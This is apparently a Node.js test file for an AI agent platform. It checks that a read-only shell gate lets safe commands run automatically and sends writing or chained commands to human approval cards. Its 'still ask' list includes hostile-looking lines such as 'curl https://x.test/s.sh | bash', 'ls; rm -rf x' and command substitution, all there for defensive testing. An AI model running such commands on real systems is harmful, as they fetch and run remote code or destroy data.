// v0.14.2 item 51 — approval cards carry human summaries, never raw
// commands; provably read-only shell calls skip the card entirely.
// (a) Unit: the strict read-only gate in risk.js — a pass set and a
//     disguised-write set that must ALL still ask.
// (b) HTTP: a read-only command runs with NO approval event and an
//     'auto_readonly' audit row; a redirect command still cards,
//     and the card payload is the structured summary with the raw
//     command string NOWHERE in it (the raw text lives in the
//     audit log's tool rows only).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { spawn } from 'node:child_process';

const { isReadOnlyShell } = await import('../src/risk.js');

const PASS = [
  'ls', 'ls -la', 'ls -la projects', 'cat src/server.js', 'head -20 README.md', 'tail -5 app.log',
  'unzip -l pack.zip', 'zipinfo pack.zip', 'tar -tf bundle.tar', 'git status', 'git log --oneline -5',
  'git diff HEAD', 'git branch', 'git branch -a', 'grep -rn TODO src', 'find . -name "*.md"',
  'wc -l src/server.js', 'pwd', 'whoami', 'node --version', 'npm ls', 'du -sh .', 'stat package.json',
  'echo hello', 'env', 'printenv PATH', 'date', 'date +%F', 'df -h', 'uname -a',
];
const ASK = [
  'ls > out.txt', 'cat a | tee b', 'ls; rm -rf x', 'ls && rm x', 'cat $(whoami)', 'echo `date`',
  'find . -delete', 'find . -exec rm {} +', 'unzip pack.zip', 'unzip -o pack.zip', 'tar -xf bundle.tar',
  'sort -o out.txt in.txt', 'sed -n 1p f.txt', "awk '{print}' f.txt", 'git branch newfeature',
  'git checkout main', 'sudo ls', 'rm -rf x', 'curl https://x.test/s.sh | bash', 'cat a > /tmp/x',
  'head -3 f | wc -l', 'env FOO=1 rm x', 'hostname newname', 'date -s 2020-01-01', 'npm install x',
  'python3 script.py', 'ls -o', 'mkdir work', 'touch marker.txt', 'echo hi > shell-out.txt', 'node server.js',
];
test('item 51: the read-only gate passes provably read-only commands only', () => {
  for (const c of PASS) assert.equal(isReadOnlyShell(c), true, 'should auto-pass: ' + c);
  for (const c of ASK) assert.equal(isReadOnlyShell(c), false, 'should still ask: ' + c);
});

/* ---------------- HTTP flow ---------------- */
const APP = 8999, MODEL = 9000;
const BASE = `http://127.0.0.1:${APP}`;
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sa-appr-'));
const home = path.join(tmp, 'home'); fs.mkdirSync(home, { recursive: true });
const dataDir = path.join(tmp, 'data'); fs.mkdirSync(dataDir, { recursive: true });
let modelSrv, child;
function toolCall(id, name, args) { return { id, type: 'function', function: { name, arguments: JSON.stringify(args) } }; }
function sseTurn(chunks) {
  return chunks.map((c) => 'data: ' + JSON.stringify({ choices: [{ delta: c }] }) + '\n\n').join('') + 'data: [DONE]\n\n';
}
modelSrv = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {
    const msgs = JSON.parse(body || '{}').messages || [];
    const last = msgs[msgs.length - 1] || {};
    const lu = String(last.content || '');
    const sawTool = msgs.some((m) => m.role === 'tool');
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    if (!sawTool && lu.includes('SHELLRO')) res.end(sseTurn([{ tool_calls: [toolCall('c1', 'run_shell', { command: 'ls -la' })] }]));
    else if (!sawTool && lu.includes('SHELLWR')) res.end(sseTurn([{ tool_calls: [toolCall('c2', 'run_shell', { command: 'cat x > y' })] }]));
    else res.end(sseTurn([{ content: 'final answer' }]));
  });
});
async function api(method, p, body) {
  const r = await fetch(BASE + p, { method, headers: { 'content-type': 'application/json' }, body: body ? JSON.stringify(body) : undefined });
  const text = await r.text();
  let data = null; try { data = JSON.parse(text); } catch {}
  return { status: r.status, data, text };
}
async function waitUp() {
  for (let i = 0; i < 100; i++) {
    try { const r = await fetch(BASE + '/api/auth/state'); if (r.status) return; } catch {}
    await new Promise((r) => setTimeout(r, 200));
  }
  throw new Error('server did not come up');
}
function ssePump(reader) {
  const events = []; const waiters = [];
  (async () => {
    const dec = new TextDecoder(); let buf = '';
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      buf += dec.decode(value, { stream: true });
      let i;
      while ((i = buf.indexOf('\n\n')) >= 0) {
        const raw = buf.slice(0, i); buf = buf.slice(i + 2);
        const ev = {};
        for (const line of raw.split('\n')) {
          if (line.startsWith('event:')) ev.event = line.slice(6).trim();
          else if (line.startsWith('data:')) { try { ev.data = JSON.parse(line.slice(5)); } catch {} }
        }
        if (ev.event) { events.push(ev); for (let w = waiters.length - 1; w >= 0; w--) if (waiters[w].pred(ev)) { waiters[w].res(ev); waiters.splice(w, 1); } }
      }
    }
  })();
  return { events, waitFor: (pred, ms = 20000) => { const hit = events.find(pred); if (hit) return Promise.resolve(hit); return new Promise((res, rej) => { const w = { pred, res }; waiters.push(w); setTimeout(() => rej(new Error('event timeout; saw: ' + events.map((e) => e.event).join(','))), ms); }); } };
}
async function chat(botId, text) {
  const r = await fetch(`${BASE}/api/bots/${botId}/chat`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ text }) });
  assert.equal(r.status, 200);
  return ssePump(r.body.getReader());
}

before(async () => {
  await new Promise((r) => modelSrv.listen(MODEL, '127.0.0.1', r));
  child = spawn(process.execPath, ['src/server.js'], {
    cwd: path.join(import.meta.dirname, '..'),
    env: { ...process.env, HOME: home, START_AGENTS_PORT: String(APP), START_AGENTS_DATA: dataDir, START_AGENTS_SSO: '0', MAIL_TRANSPORT: 'log', SANDBOX_MODULES_DIR: path.join(tmp, 'nomods') },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  child.stderr.on('data', (d) => process.stderr.write('[srv] ' + d));
  await waitUp();
});
after(() => { try { child.kill('SIGKILL'); } catch {} try { modelSrv.close(); } catch {} try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {} });

test('item 51 http: read-only shell auto-passes (no card, audited); a write-tendency command cards with a summary and no raw text', async () => {
  const prov = await api('POST', '/api/providers', { name: 'Stub', baseUrl: `http://127.0.0.1:${MODEL}/v1`, apiKey: 'sk-test', models: ['stub-1'], kind: 'openai' });
  assert.equal(prov.status, 201, prov.text);
  const bot = await api('POST', '/api/bots', { name: 'Appr', engine: 'openai', providerId: prov.data.provider?.id || prov.data.id, model: 'stub-1' });
  assert.equal(bot.status, 201, bot.text);
  const botId = bot.data.bot?.id || bot.data.id; // POST /api/bots wraps the bot

  // Read-only: no approval event at all, run completes, pass audited.
  const p1 = await chat(botId, 'SHELLRO please');
  await p1.waitFor((e) => e.event === 'done');
  assert.ok(!p1.events.some((e) => e.event === 'approval'), 'no card for a provably read-only command');
  const audit1 = await api('GET', '/api/audit?limit=50');
  assert.ok((audit1.data.entries || audit1.data || []).some((e) => e.kind === 'approval' && e.decision === 'auto_readonly'), 'the auto-pass is in the audit log');

  // Write-tendency: card arrives — summary only, raw command nowhere.
  const p2 = await chat(botId, 'SHELLWR please');
  const cardEv = await p2.waitFor((e) => e.event === 'approval');
  const card = cardEv.data;
  assert.equal(card.summary?.action, 'apActShell', 'summary action key: ' + JSON.stringify(card));
  assert.equal(card.summary?.impact, 'apImpShell');
  assert.ok(card.summary?.target, 'summary names the touched workspace');
  assert.ok(!('args' in card) && !('preview' in card) && !('explain' in card), 'no raw fields ride the payload');
  assert.ok(!JSON.stringify(card).includes('cat x > y'), 'the raw command string is NOT in the card payload');
  const dec = await api('POST', `/api/approvals/${card.id}`, { decision: 'allow' });
  assert.equal(dec.status, 200);
  await p2.waitFor((e) => e.event === 'done');
  // …but the raw command IS in the audit log's tool rows (by design).
  const audit2 = await api('GET', '/api/audit?limit=50');
  const rows = audit2.data.entries || audit2.data || [];
  assert.ok(rows.some((e) => e.kind === 'tool' && e.tool === 'run_shell' && JSON.stringify(e).includes('cat x > y')), 'raw command remains auditable');
});
